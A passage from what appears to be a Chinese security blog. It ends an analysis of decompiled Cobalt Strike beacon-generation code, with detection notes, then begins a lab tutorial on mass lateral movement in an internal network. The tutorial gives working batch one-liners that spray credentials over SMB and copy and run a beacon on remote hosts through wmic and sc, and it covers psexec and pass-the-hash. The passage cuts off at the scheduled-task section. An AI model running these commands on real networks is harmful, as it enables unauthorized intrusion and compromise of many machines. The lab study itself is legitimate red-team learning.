-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">protected byte[] exportBeaconStage(int var1, String var2, boolean var3, boolean var4, String var5) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        long var6 &#x3D; System.currentTimeMillis();</span><br><span class="line">        byte[] var8 &#x3D; SleevedResource.readResource(var5); &#x2F;&#x2F;获取sleeve&#x2F;beacon.dll的内容</span><br><span class="line">        if (var2.length() &gt; 254) &#123;</span><br><span class="line">            var2 &#x3D; var2.substring(0, 254);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String[] var9 &#x3D; this.c2profile.getString(&quot;.http-get.uri&quot;).split(&quot; &quot;); &#x2F;&#x2F;加载配置文件中.http-get.uri的值</span><br><span class="line">        String[] var10 &#x3D; var2.split(&quot;,\\s*&quot;);</span><br><span class="line">        LinkedList var11 &#x3D; new LinkedList();</span><br><span class="line"></span><br><span class="line">        for(int var12 &#x3D; 0; var12 &lt; var10.length; ++var12) &#123;</span><br><span class="line">            var11.add(var10[var12]);</span><br><span class="line">            var11.add(CommonUtils.pick(var9));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String var32;</span><br><span class="line">        while(var11.size() &gt; 2 &amp;&amp; CommonUtils.join(var11, &quot;,&quot;).length() &gt; 255) &#123;</span><br><span class="line">            var32 &#x3D; var11.removeLast() + &quot;&quot;;</span><br><span class="line">            String var13 &#x3D; var11.removeLast() + &quot;&quot;;</span><br><span class="line">            CommonUtils.print_info(&quot;dropping &quot; + var13 + var32 + &quot; from Beacon profile for size&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var32 &#x3D; randua(this.c2profile);</span><br><span class="line">        int var33 &#x3D; Integer.parseInt(this.c2profile.getString(&quot;.sleeptime&quot;)); &#x2F;&#x2F;加载配置文件的sleeptime的值</span><br><span class="line">        String var14 &#x3D; CommonUtils.pick(this.c2profile.getString(&quot;.http-post.uri&quot;).split(&quot; &quot;));</span><br><span class="line">        byte[] var15 &#x3D; this.c2profile.recover_binary(&quot;.http-get.server.output&quot;);</span><br><span class="line">        byte[] var16 &#x3D; this.c2profile.apply_binary(&quot;.http-get.client&quot;);</span><br><span class="line">        byte[] var17 &#x3D; this.c2profile.apply_binary(&quot;.http-post.client&quot;);</span><br><span class="line">        int var18 &#x3D; this.c2profile.size(&quot;.http-get.server.output&quot;, 1048576);</span><br><span class="line">        int var19 &#x3D; Integer.parseInt(this.c2profile.getString(&quot;.jitter&quot;));</span><br><span class="line">        if (var19 &lt; 0 || var19 &gt; 99) &#123;</span><br><span class="line">            var19 &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int var20 &#x3D; Integer.parseInt(this.c2profile.getString(&quot;.maxdns&quot;));</span><br><span class="line">        if (var20 &lt; 0 || var20 &gt; 255) &#123;</span><br><span class="line">            var20 &#x3D; 255;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int var21 &#x3D; 0;</span><br><span class="line">        if (var3) &#123;</span><br><span class="line">            var21 |&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (var4) &#123;</span><br><span class="line">            var21 |&#x3D; 8;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        long var22 &#x3D; CommonUtils.ipToLong(this.c2profile.getString(&quot;.dns_idle&quot;));</span><br><span class="line">        int var24 &#x3D; Integer.parseInt(this.c2profile.getString(&quot;.dns_sleep&quot;));</span><br><span class="line">        Settings var25 &#x3D; new Settings();</span><br><span class="line">        var25.addShort(1, var21);</span><br><span class="line">        var25.addShort(2, var1);</span><br><span class="line">        var25.addInt(3, var33);</span><br><span class="line">        var25.addInt(4, var18);</span><br><span class="line">        var25.addShort(5, var19);</span><br><span class="line">        var25.addShort(6, var20);</span><br><span class="line">        var25.addData(7, this.publickey, 256);</span><br><span class="line">        var25.addString(8, CommonUtils.join(var11, &quot;,&quot;), 256);</span><br><span class="line">        var25.addString(9, var32, 128);</span><br><span class="line">        var25.addString(10, var14, 64);</span><br><span class="line">        var25.addData(11, var15, 256);</span><br><span class="line">        var25.addData(12, var16, 256);</span><br><span class="line">        var25.addData(13, var17, 256);</span><br><span class="line">        var25.addData(14, CommonUtils.asBinary(this.c2profile.getString(&quot;.spawnto&quot;)), 16);</span><br><span class="line">        var25.addString(29, this.c2profile.getString(&quot;.post-ex.spawnto_x86&quot;), 64);</span><br><span class="line">        var25.addString(30, this.c2profile.getString(&quot;.post-ex.spawnto_x64&quot;), 64);</span><br><span class="line">        var25.addString(15, &quot;&quot;, 128);</span><br><span class="line">        var25.addShort(31, QuickSecurity.getCryptoScheme());</span><br><span class="line">        var25.addInt(19, (int)var22);</span><br><span class="line">        var25.addInt(20, var24);</span><br><span class="line">        var25.addString(26, this.c2profile.getString(&quot;.http-get.verb&quot;), 16);</span><br><span class="line">        var25.addString(27, this.c2profile.getString(&quot;.http-post.verb&quot;), 16);</span><br><span class="line">        var25.addInt(28, this.c2profile.shouldChunkPosts() ? 96 : 0);</span><br><span class="line">        var25.addInt(37, this.c2profile.getInt(&quot;.watermark&quot;));</span><br><span class="line">        var25.addShort(38, this.c2profile.option(&quot;.stage.cleanup&quot;) ? 1 : 0);</span><br><span class="line">        var25.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);</span><br><span class="line">        String var26 &#x3D; this.listener.getHostHeader();</span><br><span class="line">        if (var26 !&#x3D; null &amp;&amp; var26.length() !&#x3D; 0) &#123;</span><br><span class="line">            if (Profile.usesHostBeacon(this.c2profile)) &#123;</span><br><span class="line">                var25.addString(54, &quot;&quot;, 128); &#x2F;&#x2F;获取host的值进行赋值</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                var25.addString(54, &quot;Host: &quot; + this.listener.getHostHeader() + &quot;\r\n&quot;, 128);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            var25.addString(54, &quot;&quot;, 128);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (Profile.usesCookieBeacon(this.c2profile)) &#123;</span><br><span class="line">            var25.addShort(50, 1);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            var25.addShort(50, 0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ProxyServer var27 &#x3D; ProxyServer.parse(this.listener.getProxyString());</span><br><span class="line">        var27.setup(var25);</span><br><span class="line">        this.setupKillDate(var25);</span><br><span class="line">        this.setupGargle(var25, var5);</span><br><span class="line">        (new ProcessInject(this.c2profile)).apply(var25);</span><br><span class="line">        byte[] var28 &#x3D; var25.toPatch();</span><br><span class="line">        var28 &#x3D; beacon_obfuscate(var28);</span><br><span class="line">        String var29 &#x3D; CommonUtils.bString(var8);</span><br><span class="line">        int var30 &#x3D; var29.indexOf(&quot;AAAABBBBCCCCDDDDEEEEFFFF&quot;); &#x2F;&#x2F;找到AAAABBBBCCCCDDDDEEEEFFFF的位置</span><br><span class="line">        var29 &#x3D; CommonUtils.replaceAt(var29, CommonUtils.bString(var28), var30); &#x2F;&#x2F;将模板的内容进行替换</span><br><span class="line">        return CommonUtils.toBytes(var29); &#x2F;&#x2F;返回替换后的结果</span><br><span class="line">    &#125; catch (IOException var31) &#123;</span><br><span class="line">        MudgeSanity.logException(&quot;export Beacon stage: &quot; + var5, var31, false);</span><br><span class="line">        return new byte[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        简单的分析后我们发现这段代码的主要作用是读取beacon.dll文件，以这个文件作为模板对一些值进行替换，并且是以找到AAAABBBBCCCCDDDDEEEEFFFF来找到要替换的位置的，但是比较奇怪的是我再beacon.dll中并没有发现AAAABBBBCCCCDDDDEEEEFFFF这个字符串。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901154145081.png" alt="image-20200901154145081"></p>
-<p>​        后面根据不同的类型的类型，调用patchArtifact方法，虽然使用的模板不同，最终还是会有4个a的特征，不过可能使用这种方式的模板比较大，因此不会有大写A这种特征。因为本身替代Stager那部分比如beacon.dll的文件内容就比较大，有200多k。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901154601816.png" alt="image-20200901154601816"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        总结一下这几种生成方式的过程和一些区别</p>
-<ul>
-<li>payload generator只是加载stager模板并且对里面host，port和uri部分进行替换，最终生成的文件只是将stager文件以字节数组的形式进行输出</li>
-<li>windows executable首先生成stager，这个stager可能非常小，再去替换模板文件中出现1024个A的地址，这种方式由于stager比较小，而且在模板插入stager之前会写入4个a，因此可以把出现4个a和a出现后的1024字节内出现多个A为特征进行检测</li>
-<li>windows executables这种方式不会再去生成stager而是使用其他的方式进行替换，而替换stager的部分模板文件过大，因此会在插入的开始出现4个a但是不会出现多个A。</li>
-</ul>
-<p><strong>参考文章</strong></p>
-<p><a href="https://xz.aliyun.com/t/8103" target="_blank" rel="noopener">从剖析CS木马生成到开发免杀工具</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于内网批量横向渗透的学习总结</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-08-31 12:07:47" itemprop="dateCreated datePublished" datetime="2020-08-31T12:07:47+08:00">2020-08-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-02 20:04:50" itemprop="dateModified" datetime="2020-09-02T20:04:50+08:00">2020-09-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
-                    <span itemprop="name">内网渗透</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​        之前的学习中我们了解了关于横向移动的方式，当我们知道了这些方式，下一步当然是想要去提高速度，在这篇文章中我将带着大家学习如何来批量上线内网主机。</p>
-<h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>192.168.3.* 为仅主机模式的网段</p>
-<p>192.168.5.*为nat模式的网段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OWA2013 192.168.3.144 192.168.5.58   边界机</span><br><span class="line">SRV-WEB-KIT 192.168.3.73   内网断网机</span><br><span class="line">PC-JERRY-KIT 192.168.3.75 192.168.5.59   内网出网机</span><br></pre></td></tr></table></figure>
-
-<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p>​        我们首先学习一下如何使用WMI来批量上线内网主机</p>
-<p>​        当我们获取了某个主机的密码，我们想测试是否有内网主机和这个主机的密码相同，首先需要扫描内网那些主机开放了445端口。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831135507642.png" alt="image-20200831135507642"></p>
-<p>​        得到这些开放445端口的ip后，我们将这些ip写到一个文件中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell echo 192.168.3.73 &gt;&gt; c:\windows\temp\host.txt</span><br><span class="line">shell echo 192.168.3.75 &gt;&gt; c:\windows\temp\host.txt</span><br></pre></td></tr></table></figure>
-
-<p>​        除了上面这种方式，当然也可以将host.txt在本地写好再上传到边界主机上。</p>
-<p>​        当我们得到哪些主机开放了445端口以后，我们想测试我们得到的密码在哪些主机上是相同的,可以使用net use建立ipc连接来进行测试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\host.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxxx&quot; &amp;&amp; if %errorlevel% equ 0 ( echo %i &gt;&gt; c:\windows\temp\login_succeed.txt ) &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140152324.png" alt="image-20200831140152324"></p>
-<p>​        然后我们准备生成一个shell，再通过wmi来执行达到批量上线的目的。shell生成最好生成pivot listener，因为我们并不能确定内网主机是否能出外网</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140743070.png" alt="image-20200831140743070"></p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140845228.png" alt="image-20200831140845228"></p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140914981.png" alt="image-20200831140914981"></p>
-<p>​        生成好以后将生成的beacon.exe上传到边界主机</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831141039574.png" alt="image-20200831141039574"></p>
-<p>​        使用wmic执行beacon.exe批量上线</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxx&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; wmic &#x2F;node:%i &#x2F;user:administrator &#x2F;password:xxx PROCESS call create &quot;\\%i\admin$\temp\beacon.exe&quot; &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831142003540.png" alt="image-20200831142003540"></p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831142030428.png" alt="image-20200831142030428"></p>
-<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>​        在cobaltstrike中，内置了可以通过jump psexec来进行横向渗透的方法，这种方法我们既可以通过建立pivot listener来批量上线，也可以通过使用smb beacon来执行上线。下面我以smb beacon为例来演示下如何通过jump psexec来批量上线内网断网主机。<br>​        要使用smb beacon来上线，首先要创建一个smb类型的listener</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144047330.png" alt="image-20200831144047330"></p>
-<p>​        选择target，按住shift选中我们想要上线的几个目标。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144139103.png" alt="image-20200831144139103"></p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144237104.png" alt="image-20200831144237104"></p>
-<p>​        选择psexec模块，listener选择我们创建的smb listener</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144319681.png" alt="image-20200831144319681"></p>
-<p>​        选择lauch后，CS执行的操作如下</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144519451.png" alt="image-20200831144519451"></p>
-<p>​        同时两台内网的主机上线，因为用的是psexec的方式，所以是通过rundll32来执行上线的</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144603432.png" alt="image-20200831144603432"></p>
-<p>​        这里对比一下WMI批量上线，我们可以发现使用WMI上线后的权限为当前用户的权限，而使用psexec上线后的权限为system权限。</p>
-<p>​        最后我们再测试下使用psexec的这种上线方式能不能通过hash传递来利用，其他的步骤是一样的，只有在传递密码时输入变成了hash</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831145220858.png" alt="image-20200831145220858"></p>
-<p>​        CobaltStrike执行的操作如下</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831145543919.png" alt="image-20200831145543919"></p>
-<p>​        执行后也可以上线</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831152157468.png" alt="image-20200831152157468"></p>
-<p>​        这里有一个小插曲，就是我第一次使用hash传递上线这两台主机时发现只有192.168.3.73这台主机上线，而win10 192.168.3.75没有上线，然后我是用impacket的psexec利用hash传递进行测试，发现无法使用administrator连接，但是我用net use 连接administrator账户又是正常的，经过排错，我发现是因为administrator账户是禁用状态导致的，启用后即可正常执行。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831152344500.png" alt="image-20200831152344500"></p>
-<p>​        这里也说明了一个问题，就是即使一个账户是禁用的，在我们知道账号密码的情况下，也是可以通过net use来连接的，但是无法通过pth来连接并且利用。</p>
-<h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p>​        既然要在cobaltstrike通过service来进行批量上线的操作，首先需要生成一个service类型的shell，其次我们需要将这个shell上传到内网主机执行来上线。</p>
-<p>​        首先在目标边界主机上创建一个pivot类型的listener</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154146904.png" alt="image-20200831154146904"></p>
-<p>​        创建时候注意在host选择边界机内网所对应的ip，这个一定要注意，否则是上线不了断网主机的。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154317379.png" alt="image-20200831154317379"></p>
-<p>​        生成一个Stageless，listener选择我们创建的listener，输出类型选择service类型</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154448333.png" alt="image-20200831154448333"></p>
-<p>​            将生成的文件上传到边界主机上</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154713116.png" alt="image-20200831154713116"></p>
-<p>​        使用sc来批量上线，至于login_success.txt那个文件怎么来的，参考WMI利用的那种方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;Admin123456&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; sc \\%i create xxxxxxxxxxxxxxxxxxxxxxxx binpath&#x3D; &quot;c:\windows\temp\beacon.exe&quot;  &amp;&amp; sc \\%i start xxxxxxxxxxxxxxxxxxxxxxxx &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831155355171.png" alt="image-20200831155355171"></p>
-<p>​        使用完以后，记得要将这个服务删除</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;Admin123456&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; sc \\%i delete xxxxxxxxxxxxxxxxxxxxxxxx &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831155845466.png" alt="image-20200831155845466"></p>
-<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>​        我们也可以使用计划任务来批量横向渗透，至于前面生成shell的过程就不演示了，我们这里还是考虑目标主机是断网的一个状态，所以还是要创建一个pivot listener，生成一个Stageless类型的shell，上传到目标边界主机。使用如下命令来创建并执行计划任务上线</p>
